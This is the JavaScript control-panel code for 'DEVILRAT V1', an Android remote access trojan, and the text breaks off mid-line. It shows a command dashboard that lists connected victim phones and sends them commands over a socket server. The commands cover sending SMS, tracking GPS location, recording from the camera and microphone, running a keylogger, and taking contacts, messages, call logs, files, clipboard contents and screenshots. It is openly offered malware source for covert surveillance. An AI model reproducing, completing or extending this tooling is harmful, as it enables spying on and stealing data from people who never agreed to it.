class DevilRatApp {
    constructor() {
        this.socket = null;
        this.devices = [];
        this.commands = [];
        this.logs = [];
        this.selectedDevice = null;
        this.connectionStatus = 'disconnected';
        this.autoRefresh = true;
        this.init();
    }

    init() {
        this.connectWebSocket();
        this.setupEventListeners();
        this.startTimers();
        this.loadInitialData();
        this.addLog('system', 'DEVILRAT V1 initialized successfully', 'system');
    }

    connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${window.location.host}`;
        
        this.socket = io(wsUrl, {
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            reconnectionAttempts: 10
        });

        this.socket.on('connect', () => {
            this.updateConnectionStatus('connected');
            this.addLog('system', 'Connected to DEVILRAT server', 'success');
            this.socket.emit('get_devices');
        });

        this.socket.on('device_list', (devices) => {
            this.devices = devices;
            this.renderDevices();
            this.updateStats();
        });

        this.socket.on('device_connected', (device) => {
            this.addDevice(device);
            this.addLog('device', `Device connected: ${device.model}`, 'success');
        });

        this.socket.on('device_update', (device) => {
            this.updateDevice(device);
        });

        this.socket.on('device_disconnected', (device) => {
            this.updateDevice({...device, status: 'offline'});
            this.addLog('device', `Device disconnected: ${device.model}`, 'error');
        });

        this.socket.on('command_sent', (command) => {
            this.commands.push(command);
            this.addLog('command', `Command sent: ${command.command}`, 'info');
            this.updateStats();
        });

        this.socket.on('command_completed', (command) => {
            this.addLog('command', `Command completed: ${command.command}`, 'success');
        });

        this.socket.on('file_uploaded', (data) => {
            this.addLog('file', `File uploaded: ${data.filename} (${data.size} bytes)`, 'info');
        });

        this.socket.on('disconnect', () => {
            this.updateConnectionStatus('disconnected');
            this.addLog('system', 'Disconnected from server', 'error');
        });

        this.socket.on('connect_error', (error) => {
            this.addLog('system', `Connection error: ${error.message}`, 'error');
        });
    }

    setupEventListeners() {
        // Modal close on outside click
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.closeModal();
                    this.closeDeviceModal();
                }
            });
        });

        // Escape key to close modals
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closeModal();
                this.closeDeviceModal();
            }
        });
    }

    startTimers() {
        // Update time
        setInterval(() => {
            const now = new Date();
            document.getElementById('timeDisplay').textContent = 
                now.toLocaleTimeString('en-US', {hour12: false});
        }, 1000);

        // Auto refresh devices
        setInterval(() => {
            if (this.autoRefresh && this.socket?.connected) {
                this.socket.emit('get_devices');
            }
        }, 10000);
    }

    loadInitialData() {
        // Load devices via API
        fetch('/api/devices')
            .then(r => r.json())
            .then(devices => {
                this.devices = devices;
                this.renderDevices();
                this.updateStats();
            })
            .catch(err => {
                this.addLog('system', `Failed to load devices: ${err.message}`, 'error');
            });

        // Load health status
        fetch('/api/health')
            .then(r => r.json())
            .then(data => {
                this.updateStats();
            });
    }

    updateConnectionStatus(status) {
        this.connectionStatus = status;
        const statusEl = document.getElementById('connectionStatus');
        
        if (status === 'connected') {
            statusEl.className = 'connection-status connected';
            statusEl.innerHTML = '<i class="fas fa-wifi"></i><span>CONNECTED</span>';
        } else {
            statusEl.className = 'connection-status disconnected';
            statusEl.innerHTML = '<i class="fas fa-wifi-slash"></i><span>DISCONNECTED</span>';
        }
    }

    addDevice(device) {
        const existingIndex = this.devices.findIndex(d => d.id === device.id);
        if (existingIndex >= 0) {
            this.devices[existingIndex] = device;
        } else {
            this.devices.push(device);
        }
        this.renderDevices();
        this.updateStats();
    }

    updateDevice(device) {
        const index = this.devices.findIndex(d => d.id === device.id);
        if (index >= 0) {
            this.devices[index] = { ...this.devices[index], ...device };
            this.renderDevices();
            this.updateStats();
        }
    }

    renderDevices() {
        const deviceList = document.getElementById('deviceList');
        
        if (this.devices.length === 0) {
            deviceList.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-ghost"></i>
                    <p>No devices connected</p>
                    <small>Waiting for Android devices to connect...</small>
                </div>
            `;
            return;
        }

        deviceList.innerHTML = '';
        
        this.devices.forEach(device => {
            const isOnline = device.status === 'online';
            const card = document.createElement('div');
            card.className = `device-card ${isOnline ? 'online' : 'offline'}`;
            card.innerHTML = `
                <div class="device-header">
                    <div class="device-model">${device.model}</div>
                    <div class="device-status ${isOnline ? 'online' : 'offline'}">
                        ${isOnline ? 'ONLINE' : 'OFFLINE'}
                    </div>
                </div>
                <div class="device-info">
                    <div><i class="fas fa-battery-full"></i> ${device.battery}</div>
                    <div><i class="fab fa-android"></i> ${device.android}</div>
                    <div><i class="fas fa-wifi"></i> ${device.ip || 'Unknown'}</div>
                    <div><i class="fas fa-clock"></i> ${new Date(device.connected).toLocaleTimeString()}</div>
                </div>
                <div class="device-actions">
                    <button class="btn-select" onclick="app.selectDevice('${device.id}')">
                        <i class="fas fa-crosshairs"></i> SELECT
                    </button>
                    <button class="btn-command" onclick="app.showDeviceCommands('${device.id}')">
                        <i class="fas fa-terminal"></i> COMMANDS
                    </button>
                </div>
            `;
            deviceList.appendChild(card);
        });
    }

    selectDevice(deviceId) {
        this.selectedDevice = deviceId;
        const device = this.devices.find(d => d.id === deviceId);
        
        // Highlight selected device
        document.querySelectorAll('.device-card').forEach(card => {
            card.classList.remove('selected');
        });
        event.target.closest('.device-card').classList.add('selected');
        
        // Show notification
        this.showNotification('Device Selected', `Selected: ${device.model}`);
        
        // Show command modal
        setTimeout(() => this.showCommandModal('quick'), 300);
    }

    showDeviceCommands(deviceId) {
        this.selectDevice(deviceId);
        this.showCommandModal('advanced');
    }

    showCommandModal(type) {
        if (!this.selectedDevice) {
            this.showDeviceSelection();
            return;
        }

        const modal = document.getElementById('commandModal');
        const modalBody = document.getElementById('modalBody');
        const device = this.devices.find(d => d.id === this.selectedDevice);

        let content = '';
        let title = '';

        switch(type) {
            case 'sms':
                title = '📱 SEND SMS';
                content = `
                    <div class="input-group">
                        <label class="input-label">Phone Number:</label>
                        <input type="text" class="input-field" id="smsNumber" 
                               placeholder="+628123456789" value="+628123456789">
                    </div>
                    <div class="input-group">
                        <label class="input-label">Message:</label>
                        <textarea class="textarea-field" id="smsMessage" 
                                  placeholder="Type your message..." rows="4">Test from DEVILRAT</textarea>
                    </div>
                    <button class="btn-execute" onclick="app.sendSMS()">
                        <i class="fas fa-paper-plane"></i> SEND SMS
                    </button>
                `;
                break;

            case 'location':
                title = '📍 GET LOCATION';
                content = `
                    <p>Get real-time GPS location from <strong>${device.model}</strong></p>
                    <div class="input-group">
                        <label class="input-label">Accuracy:</label>
                        <select class="select-field" id="locationAccuracy">
                            <option value="high">High Accuracy</option>
                            <option value="medium">Medium Accuracy</option>
                            <option value="low">Low Accuracy</option>
                        </select>
                    </div>
                    <button class="btn-execute" onclick="app.executeCommand('location')">
                        <i class="fas fa-map-marker-alt"></i> GET LOCATION
                    </button>
                `;
                break;

            case 'camera':
                title = '📸 CAMERA CONTROL';
                content = `
                    <div class="input-group">
                        <label class="input-label">Camera Type:</label>
                        <select class="select-field" id="cameraType">
                            <option value="front">Front Camera</option>
                            <option value="back">Back Camera</option>
                            <option value="both">Both Cameras</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label class="input-label">Duration (seconds):</label>
                        <input type="number" class="input-field" id="cameraDuration" 
                               value="10" min="1" max="60">
                    </div>
                    <div class="input-group">
                        <label class="input-label">Quality:</label>
                        <select class="select-field" id="cameraQuality">
                            <option value="high">High Quality</option>
                            <option value="medium">Medium Quality</option>
                            <option value="low">Low Quality</option>
                        </select>
                    </div>
                    <button class="btn-execute" onclick="app.executeCameraCommand()">
                        <i class="fas fa-camera"></i> START RECORDING
                    </button>
                `;
                break;

            case 'mic':
                title = '🎤 MICROPHONE';
                content = `
                    <div class="input-group">
                        <label class="input-label">Duration (seconds):</label>
                        <input type="number" class="input-field" id="micDuration" 
                               value="30" min="1" max="300">
                    </div>
                    <div class="input-group">
                        <label class="input-label">Quality:</label>
                        <select class="select-field" id="micQuality">
                            <option value="high">High Quality</option>
                            <option value="medium">Medium Quality</option>
                            <option value="low">Low Quality</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label class="input-label">Output Format:</label>
                        <select class="select-field" id="micFormat">
                            <option value="mp3">MP3</option>
                            <option value="wav">WAV</option>
                            <option value="aac">AAC</option>
                        </select>
                    </div>
                    <button class="btn-execute" onclick="app.executeCommand('microphone')">
                        <i class="fas fa-microphone"></i> START RECORDING
                    </button>
                `;
                break;

            case 'quick':
                title = '⚡ QUICK COMMANDS';
                content = `
                    <div class="quick-commands">
                        <button class="action-card sms" onclick="app.showCommandModal('sms')">
                            <div class="action-icon"><i class="fas fa-sms"></i></div>
                            <div class="action-title">SEND SMS</div>
                        </button>
                        <button class="action-card location" onclick="app.showCommandModal('location')">
                            <div class="action-icon"><i class="fas fa-map-marker-alt"></i></div>
                            <div class="action-title">LOCATION</div>
                        </button>
                        <button class="action-card camera" onclick="app.showCommandModal('camera')">
                            <div class="action-icon"><i class="fas fa-camera"></i></div>
                            <div class="action-title">CAMERA</div>
                        </button>
                        <button class="action-card mic" onclick="app.showCommandModal('mic')">
                            <div class="action-icon"><i class="fas fa-microphone"></i></div>
                            <div class="action-title">MICROPHONE</div>
                        </button>
                        <button class="action-card contacts" onclick="app.executeCommand('contacts')">
                            <div class="action-icon"><i class="fas fa-address-book"></i></div>
                            <div class="action-title">CONTACTS</div>
                        </button>
                        <button class="action-card messages" onclick="app.executeCommand('messages')">
                            <div class="action-icon"><i class="fas fa-comment-alt"></i></div>
                            <div class="action-title">MESSAGES</div>
                        </button>
                    </div>
                `;
                break;

            case 'advanced':
                title = '⚙️ ADVANCED COMMANDS';
                content = `
                    <div class="advanced-commands">
                        <button class="btn-advanced" onclick="app.executeCommand('files')">
                            <i class="fas fa-folder"></i> BROWSE FILES
                        </button>
                        <button class="btn-advanced" onclick="app.executeCommand('calls')">
                            <i class="fas fa-phone"></i> CALL LOGS
                        </button>
                        <button class="btn-advanced" onclick="app.executeCommand('apps')">
                            <i class="fas fa-th"></i> INSTALLED APPS
                        </button>
                        <button class="btn-advanced" onclick="app.executeCommand('screenshot')">
                            <i class="fas fa-camera-retro"></i> SCREENSHOT
                        </button>
                        <button class="btn-advanced" onclick="app.executeCommand('keylogger')">
                            <i class="fas fa-keyboard"></i> KEYLOGGER
                        </button>
                        <button class="btn-advanced" onclick="app.executeCommand('clipboard')">
                            <i class="fas fa-clipboard"></i> CLIPBOARD
                        </button>
                        <button class="btn-advanced" onclick="app.executeCommand('vibrate')">
                            <i class="fas fa-vibrate"></i> VIBRATE DEVICE
                        </button>
                        <button class="btn-advanced" onclick="app.executeCommand('toast')">
                            <i class="fas fa-bell"></i> SHOW TOAST
                        </button>
                    </div>
                `;
                break;
        }

        document.getElementById('modalTitle').innerHTML = title;
        modalBody.innerHTML = content;
        modal.style.display = 'flex';
        
        // Animate modal content
        setTimeout(() => {
            modalBody.style.opacity = '1';
            modalBody.style.transform = 'translateY(0)';
        }, 10);
    }

    showDeviceSelection() {
        const modal = document.getElementById('deviceModal');
        const list = document.getElementById('deviceSelectList');
        
        list.innerHTML = '';
        
        if (this.devices.length === 0) {
            list.innerHTML = '<p class="no-devices">No devices available</p>';
        } else {
            this.devices.forEach(device => {
                const btn = document.createElement('button');
                btn.className = 'device-select-btn';
                btn.innerHTML = `
                    <div style="font-weight: bold; color: white;">${device.model}</div>
                    <div style="font-size: 0.9em; color: #888;">ID: ${device.id.substring(0, 8)}...</div>
                    <div style="font-size: 0.8em; margin-top: 5px;">
                        Status: <span class="${device.status === 'online' ? 'online' : 'offline'}" 
                               style="color: ${device.status === 'online' ? '#00ff00' : '#ff0000'}">
                               ${device.status.toUpperCase()}</span>
                    </div>
                    <div style="font-size: 0.8em; color: #888; margin-top: 5px;">
                        🔋 ${device.battery} | 📱 ${device.android}
                    </div>
                `;
                btn.onclick = () => {
                    this.selectedDevice = device.id;
                    this.closeDeviceModal();
                    this.showNotification('Device Selected', device.model);
                    setTimeout(() => this.showCommandModal('quick'), 300);
                };
                list.appendChild(btn);
            });
        }

        modal.style.display = 'flex';
    }

    sendSMS() {
        const number = document.getElementById('smsNumber').value;
        const message = document.getElementById('smsMessage').value;
        
        if (!number || !message) {
            this.showNotification('Error', 'Phone number and message are required', 'error');
            return;
        }

        this.executeCommand('sms', { number, message });
        this.closeModal();
    }

    executeCameraCommand() {
        const type = document.getElementById('cameraType').value;
        const duration = parse
